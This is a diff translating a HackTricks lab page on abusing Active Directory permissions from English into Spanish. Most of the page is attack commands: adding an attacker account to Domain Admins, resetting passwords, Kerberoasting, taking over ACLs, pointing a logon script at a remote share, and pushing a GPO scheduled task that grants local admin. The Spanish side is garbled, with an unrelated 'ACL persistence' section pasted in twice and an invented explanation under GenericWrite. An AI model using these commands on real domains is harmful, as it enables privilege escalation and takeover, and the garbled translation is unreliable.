@@ -1,106 +1,137 @@
-# Abusing Active Directory ACLs/ACEs
+# Abusando de los ACLs/ACEs de Active Directory
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Context
+## Contexto
 
-This lab is to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Acccess Control Entries (ACEs) that make up DACLs.
+Este laboratorio es para abusar de los permisos débiles de las Listas de Control de Acceso Discrecional (DACLs) y las Entradas de Control de Acceso (ACEs) de Active Directory que conforman las DACLs.
 
-Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects (i.e change account name, reset password, etc).
+Los objetos de Active Directory, como los usuarios y los grupos, son objetos seguros y las DACL/ACEs definen quién puede leer/modificar esos objetos (es decir, cambiar el nombre de la cuenta, restablecer la contraseña, etc.).
 
-An example of ACEs for the "Domain Admins" securable object can be seen here:
+Un ejemplo de ACEs para el objeto seguro "Administradores de dominio" se puede ver aquí:
 
 ![](../../../.gitbook/assets/1.png)
 
-Some of the Active Directory object permissions and types that we as attackers are interested in:
+Algunos de los permisos y tipos de objetos de Active Directory que nos interesan como atacantes son:
 
-* **GenericAll** - full rights to the object (add users to a group or reset user's password)
-* **GenericWrite** - update object's attributes (i.e logon script)
-* **WriteOwner** - change object owner to attacker controlled user take over the object
-* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
-* **AllExtendedRights** - ability to add user to a group or reset password
-* **ForceChangePassword** - ability to change user's password
-* **Self (Self-Membership)** - ability to add yourself to a group
+* **GenericAll** - derechos completos sobre el objeto (añadir usuarios a un grupo o restablecer la contraseña del usuario)
+* **GenericWrite** - actualizar los atributos del objeto (es decir, el script de inicio de sesión)
+* **WriteOwner** - cambiar el propietario del objeto a un usuario controlado por el atacante para tomar el control del objeto
+* **WriteDACL** - modificar las ACEs del objeto y dar al atacante el derecho de control total sobre el objeto
+* **AllExtendedRights** - capacidad de añadir un usuario a un grupo o restablecer la contraseña
+* **ForceChangePassword** - capacidad de cambiar la contraseña del usuario
+* **Self (Self-Membership)** - capacidad de añadirse a uno mismo a un grupo
 
-In this lab, we are going to explore and try to exploit most of the above ACEs.
+En este laboratorio, vamos a explorar e intentar explotar la mayoría de los ACEs mencionados anteriormente.
 
-It's worth familiarizing yourself with all of the [BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) and as many Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) as possible as you never know when you may encounter a less common one during an assessment.
+Vale la pena familiarizarse con todos los [BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) y con tantos [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) de Active Directory como sea posible, ya que nunca se sabe cuándo se puede encontrar uno menos común durante una evaluación.
 
-## GenericAll on User
+## GenericAll en Usuario
 
-Using powerview, let's check if our attacking user `spotless` has `GenericAll rights` on the AD object for the user `delegate`:
-
+Usando powerview, comprobemos si nuestro usuario atacante `spotless` tiene derechos de `GenericAll` sobre el objeto AD para el usuario `delegate`:
 ```csharp
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
 ```
-
-We can see that indeed our user `spotless` has the `GenericAll` rights, effectively enabling the attacker to take over the account:
+Podemos ver que efectivamente nuestro usuario `spotless` tiene los derechos de `GenericAll`, lo que permite al atacante tomar el control de la cuenta:
 
 ![](../../../.gitbook/assets/2.png)
 
-*   **Change password**: You could just change the password of that user with
+*   **Cambiar la contraseña**: simplemente se puede cambiar la contraseña de ese usuario con el siguiente comando:
 
     ```bash
     net user <username> <password> /domain
     ```
-*   **Targeted Kerberoasting**: You could make the user **kerberoastable** setting an **SPN** on the account, kerberoast it and attempt to crack offline:
+*   **Kerberoasting dirigido**: se puede hacer que el usuario sea **kerberoastable** estableciendo un **SPN** en la cuenta, kerberoastearlo e intentar descifrarlo sin conexión:
 
     ```powershell
-    # Set SPN
+    # Establecer SPN
     Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
-    # Get Hash
+    # Obtener hash
     .\Rubeus.exe kerberoast /user:<username> /nowrap
-    # Clean SPN
+    # Limpiar SPN
     Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 
-    # You can also use the tool https://github.com/ShutdownRepo/targetedKerberoast 
-    # to get hashes of one or all the users
+    # También se puede usar la herramienta https://github.com/ShutdownRepo/targetedKerberoast 
+    # para obtener hashes de uno o todos los usuarios
     python3 targetedKerberoast.py -domain.local -u <username> -p password -v
     ```
-*   **Targeted ASREPRoasting**: You could make the user **ASREPRoastable** by **disabling** **preauthentication** and then ASREProast it.
+*   **ASREPRoasting dirigido**: se puede hacer que el usuario sea **ASREPRoastable** **desactivando** la **preautenticación** y luego ASREProastearlo.
 
     ```powershell
     Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
     ```
 
-## GenericAll on Group
+## GenericAll en Grupo
 
-Let's see if `Domain admins` group has any weak permissions. First of, let's get its `distinguishedName`:
-
+Veamos si el grupo `Domain admins` tiene algún permiso débil. Primero, obtengamos su `distinguishedName`:
 ```csharp
 Get-NetGroup "domain admins" -FullData
 ```
+# Abuso de persistencia de ACL
 
-![](../../../.gitbook/assets/4.png)
+## Descripción
 
+El abuso de persistencia de ACL se refiere a la técnica de modificar los permisos de acceso de un objeto en Active Directory para lograr persistencia en el sistema. Esto se logra mediante la adición de permisos de acceso a un objeto que permiten a un usuario o grupo específico realizar acciones que normalmente no podrían realizar. Por ejemplo, un atacante podría agregar permisos de acceso a un objeto que le permita crear una cuenta de usuario en Active Directory, lo que le permitiría mantener el acceso al sistema incluso después de que se hayan tomado medidas para eliminar su acceso.
+
+## Metodología
+
+La metodología para el abuso de persistencia de ACL implica los siguientes pasos:
+
+1. Identificar un objeto en Active Directory que tenga permisos de acceso que puedan ser abusados.
+2. Modificar los permisos de acceso del objeto para permitir que un usuario o grupo específico realice acciones que normalmente no podrían realizar.
+3. Utilizar los permisos de acceso modificados para lograr persistencia en el sistema.
+
+### Identificación de objetos con permisos de acceso abusables
+
+Para identificar objetos en Active Directory que tengan permisos de acceso que puedan ser abusados, se pueden utilizar las siguientes herramientas:
+
+* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+* [ADACLScanner](https://github.com/canix1/ADACLScanner)
+
+### Modificación de permisos de acceso
+
+Una vez que se ha identificado un objeto con permisos de acceso abusables, se pueden utilizar las siguientes herramientas para modificar los permisos de acceso:
+
+* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+* [ADModify](https://www.microsoft.com/en-us/download/details.aspx?id=19419)
+
+### Utilización de permisos de acceso modificados
+
+Una vez que se han modificado los permisos de acceso de un objeto en Active Directory, se pueden utilizar los permisos de acceso modificados para lograr persistencia en el sistema. Algunos ejemplos de cómo se pueden utilizar los permisos de acceso modificados incluyen:
+
+* Crear una cuenta de usuario en Active Directory que tenga permisos de administrador.
+* Agregar un usuario o grupo a un grupo de administradores existente.
+* Modificar los permisos de acceso de un objeto para permitir que un usuario o grupo específico tenga acceso a información confidencial.
+
+## Mitigación
+
+Para mitigar el abuso de persistencia de ACL, se deben seguir las mejores prácticas de seguridad de Active Directory, que incluyen:
+
+* Limitar los permisos de acceso a los objetos de Active Directory solo a los usuarios y grupos que necesitan acceso.
+* Utilizar grupos de seguridad para asignar permisos de acceso en lugar de asignar permisos de acceso directamente a los usuarios.
+* Monitorear los cambios en los permisos de acceso de los objetos de Active Directory y tomar medidas inmediatas si se detecta un cambio no autorizado.
 ```csharp
  Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
 ```
-
-We can see that our attacking user `spotless` has `GenericAll` rights once again:
+Podemos ver que nuestro usuario atacante `spotless` tiene derechos de `GenericAll` una vez más:
 
 ![](../../../.gitbook/assets/5.png)
 
-Effectively, this allows us to add ourselves (the user `spotless`) to the `Domain Admin` group:
-
+Efectivamente, esto nos permite añadirnos a nosotros mismos (el usuario `spotless`) al grupo `Domain Admin`:
 ```csharp
 net group "domain admins" spotless /add /domain
 ```
-
-![](../../../.gitbook/assets/6.gif)
-
-Same could be achieved with Active Directory or PowerSploit module:
-
+¡Se puede lograr lo mismo con el módulo de Active Directory o PowerSploit!
 ```csharp
 # with active directory module
 Add-ADGroupMember -Identity "domain admins" -Members spotless
@@ -108,153 +139,157 @@ Add-ADGroupMember -Identity "domain admins" -Members spotless
 # with Powersploit
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
+## GenericAll / GenericWrite / Write en Computadora/Usuario
 
-## GenericAll / GenericWrite / Write on Computer/User
-
-* If you have these privileges on a **Computer object**, you can pull [Kerberos **Resource-based Constrained Delegation**: Computer Object Take Over](../resource-based-constrained-delegation.md) off.
-* If you have these privs over a user, you can use one of the [first methods explained in this page](./#genericall-on-user).
-* Or, either you have it in a Computer or a user you can use **Shadow Credentials** to impersonate it:
+* Si tienes estos privilegios en un **objeto de Computadora**, puedes llevar a cabo [Delegación Restringida Basada en Recursos de Kerberos: Toma de Control de Objeto de Computadora](../resource-based-constrained-delegation.md).
+* Si tienes estos privilegios sobre un usuario, puedes usar uno de los [primeros métodos explicados en esta página](./#genericall-on-user).
+* O, si los tienes en una Computadora o un usuario, puedes usar **Credenciales de Sombra** para suplantarlos:
 
 {% content-ref url="shadow-credentials.md" %}
 [shadow-credentials.md](shadow-credentials.md)
 {% endcontent-ref %}
 
-## WriteProperty on Group
+## WriteProperty en Grupo
 
-If our controlled user has `WriteProperty` right on `All` objects for `Domain Admin` group:
+Si nuestro usuario controlado tiene el derecho `WriteProperty` en `Todos` los objetos para el grupo `Administradores de Dominio`:
 
 ![](../../../.gitbook/assets/7.png)
 
-We can again add ourselves to the `Domain Admins` group and escalate privileges:
-
+Podemos agregar nuevamente a nuestro usuario al grupo `Administradores de Dominio` y escalar privilegios:
 ```csharp
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
+## Autoasignación de permisos en grupos
 
-![](../../../.gitbook/assets/8.png)
-
-## Self (Self-Membership) on Group
-
-Another privilege that enables the attacker adding themselves to a group:
+Otro privilegio que permite al atacante añadirse a un grupo es la autoasignación de permisos en grupos:
 
 ![](../../../.gitbook/assets/9.png)
-
 ```csharp
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
+## WriteProperty (Auto-Membresía)
 
-![](../../../.gitbook/assets/10.png)
-
-## WriteProperty (Self-Membership)
-
-One more privilege that enables the attacker adding themselves to a group:
-
+Un privilegio más que permite al atacante agregarse a sí mismo a un grupo:
 ```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
+# Abuso de persistencia de ACL
 
-![](../../../.gitbook/assets/11.png)
+## Descripción
 
+El abuso de persistencia de ACL se refiere a la técnica de modificar los permisos de acceso de un objeto en Active Directory para lograr persistencia en el sistema. Esto se logra mediante la adición de permisos de acceso a un objeto que permiten a un usuario o grupo específico realizar acciones que normalmente no podrían realizar. Por ejemplo, un atacante podría agregar permisos de acceso a un objeto que le permita crear una cuenta de usuario en Active Directory, lo que le permitiría mantener el acceso al sistema incluso después de que se hayan tomado medidas para eliminar su acceso.
+
+## Metodología
+
+La metodología para el abuso de persistencia de ACL implica los siguientes pasos:
+
+1. Identificar un objeto en Active Directory que tenga permisos de acceso que puedan ser abusados.
+2. Modificar los permisos de acceso del objeto para permitir que un usuario o grupo específico realice acciones que normalmente no podrían realizar.
+3. Utilizar los permisos de acceso modificados para lograr persistencia en el sistema.
+
+### Identificación de objetos con permisos de acceso abusables
+
+Para identificar objetos en Active Directory que tengan permisos de acceso que puedan ser abusados, se pueden utilizar las siguientes herramientas:
+
+* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+* [ADACLScanner](https://github.com/canix1/ADACLScanner)
+
+### Modificación de permisos de acceso
+
+Una vez que se ha identificado un objeto con permisos de acceso abusables, se pueden utilizar las siguientes herramientas para modificar los permisos de acceso:
+
+* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+* [ADModify](https://www.microsoft.com/en-us/download/details.aspx?id=19419)
+
+### Utilización de permisos de acceso modificados
+
+Una vez que se han modificado los permisos de acceso de un objeto en Active Directory, se pueden utilizar los permisos de acceso modificados para lograr persistencia en el sistema. Algunos ejemplos de cómo se pueden utilizar los permisos de acceso modificados incluyen:
+
+* Crear una cuenta de usuario en Active Directory que tenga permisos de administrador.
+* Agregar un usuario o grupo a un grupo de administradores existente.
+* Modificar los permisos de acceso de un objeto para permitir que un usuario o grupo específico tenga acceso a información confidencial.
+
+## Mitigación
+
+Para mitigar el abuso de persistencia de ACL, se deben seguir las mejores prácticas de seguridad de Active Directory, que incluyen:
+
+* Limitar los permisos de acceso a los objetos de Active Directory solo a los usuarios y grupos que necesitan acceso.
+* Utilizar grupos de seguridad para asignar permisos de acceso en lugar de asignar permisos de acceso directamente a los usuarios.
+* Monitorear los cambios en los permisos de acceso de los objetos de Active Directory y tomar medidas inmediatas si se detecta un cambio no autorizado.
 ```csharp
 net group "domain admins" spotless /add /domain
 ```
-
-![](../../../.gitbook/assets/12.png)
-
 ## **ForceChangePassword**
 
-If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password:
-
+Si tenemos `ExtendedRight` en el tipo de objeto `User-Force-Change-Password`, podemos restablecer la contraseña del usuario sin conocer su contraseña actual:
 ```csharp
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
 ![](../../../.gitbook/assets/13.png)
 
-Doing the same with powerview:
-
+Realizando lo mismo con powerview:
 ```csharp
 Set-DomainUserPassword -Identity delegate -Verbose
 ```
-
-![](../../../.gitbook/assets/14.png)
-
-Another method that does not require fiddling with password-secure-string conversion:
-
+Otro método que no requiere manipulación de la conversión de cadenas seguras de contraseña:
 ```csharp
 $c = Get-Credential
 Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
 ```
-
-![](../../../.gitbook/assets/15.png)
-
-...or a one liner if no interactive session is not available:
-
+...o una sola línea si no hay una sesión interactiva disponible:
 ```csharp
 Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
-
 ![](../../../.gitbook/assets/16.png)
 
-and one last way yo achieve this from linux:
-
+Y una última forma de lograr esto desde Linux:
 ```markup
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-
-More info:
+Más información:
 
 * [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
 * [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
 * [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)
 
-## WriteOwner on Group
+## WriteOwner en Grupo
 
-Note how before the attack the owner of `Domain Admins` is `Domain Admins`:
+Observe cómo antes del ataque el propietario de `Domain Admins` es `Domain Admins`:
 
 ![](../../../.gitbook/assets/17.png)
 
-After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`
-
+Después de la enumeración ACE, si encontramos que un usuario bajo nuestro control tiene derechos de `WriteOwner` en `ObjectType:All`...
 ```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
-![](../../../.gitbook/assets/18.png)
-
-...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:
-
+Podemos cambiar el propietario del objeto `Domain Admins` a nuestro usuario, que en nuestro caso es `spotless`. Tenga en cuenta que el SID especificado con `-Identity` es el SID del grupo `Domain Admins`:
 ```csharp
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 //You can also use the name instad of the SID (HTB: Reel)
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
+## GenericWrite en Usuario
 
-![](../../../.gitbook/assets/19.png)
+El permiso `GenericWrite` en un objeto de usuario de Active Directory permite a un usuario modificar los atributos del objeto, incluyendo los permisos de acceso. Esto puede ser abusado para obtener persistencia en el sistema.
 
-## GenericWrite on User
+Para explotar esta vulnerabilidad, un atacante puede agregar su propio SID (identificador de seguridad) a la lista de control de acceso (ACL) del objeto de usuario, otorgándose así permisos de acceso al objeto. Luego, el atacante puede modificar los atributos del objeto para agregar permisos adicionales a su cuenta, como `GenericAll`, lo que le permitiría tomar el control total del objeto y, por lo tanto, obtener persistencia en el sistema.
 
+Es importante tener en cuenta que este ataque solo es posible si el atacante ya tiene acceso de escritura al objeto de usuario.
 ```csharp
 Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
-![](../../../.gitbook/assets/20.png)
-
-`WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:
-
+`WriteProperty` en un `ObjectType`, que en este caso particular es `Script-Path`, permite al atacante sobrescribir la ruta del script de inicio de sesión del usuario `delegate`, lo que significa que la próxima vez que el usuario `delegate` inicie sesión, su sistema ejecutará nuestro script malicioso:
 ```csharp
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
-
-Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
+A continuación se muestra cómo se actualizó el campo de script de inicio de sesión del usuario ~~`delegate`~~ en AD:
 
 ![](../../../.gitbook/assets/21.png)
 
-## GenericWrite on Group
+## GenericWrite en Grupo
 
-This allows you to set as members of the group new users (yourself for example):
-
+Esto te permite agregar nuevos usuarios como miembros del grupo (por ejemplo, tú mismo):
 ```powershell
 # Create creds
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
@@ -266,27 +301,21 @@ Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 # Remove group member
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
-
 ## WriteDACL + WriteOwner
 
-If you are the owner of a group, like I'm the owner of a `Test` AD group:
+Si eres el propietario de un grupo, como yo soy el propietario de un grupo AD `Test`:
 
 ![](../../../.gitbook/assets/22.png)
 
-Which you can of course do through powershell:
-
+Lo cual, por supuesto, puedes hacer a través de PowerShell:
 ```csharp
 ([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
 ```
-
-![](../../../.gitbook/assets/23.png)
-
-And you have a `WriteDACL` on that AD object:
+Si tienes acceso a un objeto de AD como se muestra en la imagen anterior y tienes permisos de `WriteDACL` sobre ese objeto de AD:
 
 ![](../../../.gitbook/assets/24.png)
 
-...you can give yourself [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) privileges with a sprinkle of ADSI sorcery:
-
+...puedes darte a ti mismo privilegios de [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) con un poco de hechicería de ADSI:
 ```csharp
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -294,15 +323,13 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-
-Which means you now fully control the AD object:
+Lo que significa que ahora tienes el control total del objeto AD:
 
 ![](../../../.gitbook/assets/25.png)
 
-This effectively means that you can now add new users to the group.
+Esto significa efectivamente que ahora puedes agregar nuevos usuarios al grupo.
 
-Interesting to note that I could not abuse these privileges by using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:
-
+Es interesante destacar que no pude abusar de estos privilegios utilizando el módulo de Active Directory y los cmdlets `Set-Acl` / `Get-Acl`:
 ```csharp
 $path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
 $acl = Get-Acl -Path $path
@@ -310,90 +337,82 @@ $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object
 $acl.AddAccessRule($ace)
 Set-Acl -Path $path -AclObject $acl
 ```
-
 ![](../../../.gitbook/assets/26.png)
 
-## **Replication on the domain (DCSync)**
+## **Replicación en el dominio (DCSync)**
 
-The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.\
-[**Learn more about the DCSync attack here.**](../dcsync.md)
+El permiso **DCSync** implica tener estos permisos sobre el propio dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.\
+[**Aprende más sobre el ataque DCSync aquí.**](../dcsync.md)
 
-## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
+## Delegación de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-Sometimes, certain users/groups may be delegated access to manage Group Policy Objects as is the case with `offense\spotless` user:
+A veces, ciertos usuarios/grupos pueden ser delegados para acceder a la gestión de objetos de directiva de grupo, como es el caso del usuario `offense\spotless`:
 
 ![](../../../.gitbook/assets/a13.png)
 
-We can see this by leveraging PowerView like so:
-
+Podemos ver esto aprovechando PowerView de la siguiente manera:
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
-The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse:
+Lo siguiente indica que el usuario `offense\spotless` tiene privilegios de **WriteProperty**, **WriteDacl**, **WriteOwner** entre otros que son propensos a ser abusados:
 
 ![](../../../.gitbook/assets/a14.png)
 
-### Enumerate GPO Permissions <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>
+### Enumerar permisos de GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>
 
-We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:
+Sabemos que el ObjectDN anterior de la captura de pantalla se refiere al GPO `New Group Policy Object` ya que el ObjectDN apunta a `CN=Policies` y también a `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, que es lo mismo que en la configuración del GPO como se resalta a continuación:
 
 ![](../../../.gitbook/assets/a15.png)
 
-If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:
-
+Si queremos buscar específicamente GPOs mal configurados, podemos encadenar múltiples cmdlets de PowerSploit de la siguiente manera:
 ```powershell
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
 ![](../../../.gitbook/assets/a16.png)
 
-**Computers with a Given Policy Applied**
+**Computadoras con una política dada aplicada**
 
-We can now resolve the computer names the GPO `Misconfigured Policy` is applied to:
-
+Ahora podemos resolver los nombres de las computadoras a las que se aplica la GPO `Política mal configurada`:
 ```powershell
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
+**Políticas aplicadas a un equipo determinado**
 
-![](../../../.gitbook/assets/a17.png)
+Para obtener una lista de las políticas aplicadas a un equipo determinado, podemos ejecutar el siguiente comando:
 
-**Policies Applied to a Given Computer**
+```
+gpresult /Scope Computer /v
+```
 
+Este comando nos mostrará una lista de todas las políticas aplicadas al equipo, incluyendo las políticas de seguridad. Podemos buscar en esta lista para ver si hay alguna política que permita a un usuario malintencionado obtener permisos elevados o persistencia en el sistema.
 ```powershell
 Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 ```
-
 ![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)
 
-**OUs with a Given Policy Applied**
-
+**Unidades Organizativas con una Política Dada Aplicada**
 ```powershell
 Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
 ```
-
 ![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)
 
-### **Abuse GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)
+### **Abuso de GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)
 
-One of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled task through the GPO like so:
-
+Una de las formas de abusar de esta mala configuración y obtener la ejecución de código es crear una tarea programada inmediata a través de GPO de la siguiente manera:
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
-
 ![](../../../.gitbook/assets/a19.png)
 
-The above will add our user spotless to the local `administrators` group of the compromised box. Note how prior to the code execution the group does not contain user `spotless`:
+Lo anterior agregará a nuestro usuario "spotless" al grupo local `administrators` de la máquina comprometida. Observe cómo antes de la ejecución del código, el grupo no contiene al usuario `spotless`:
 
 ![](../../../.gitbook/assets/a20.png)
 
-### GroupPolicy module **- Abuse GPO**
+### Módulo GroupPolicy **- Abuso de GPO**
 
 {% hint style="info" %}
-You can check to see if the GroupPolicy module is installed with `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. In a pinch, you can install it with `Install-WindowsFeature –Name GPMC` as a local admin.
+Puede verificar si el módulo GroupPolicy está instalado con `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. En caso de necesidad, puede instalarlo con `Install-WindowsFeature –Name GPMC` como administrador local.
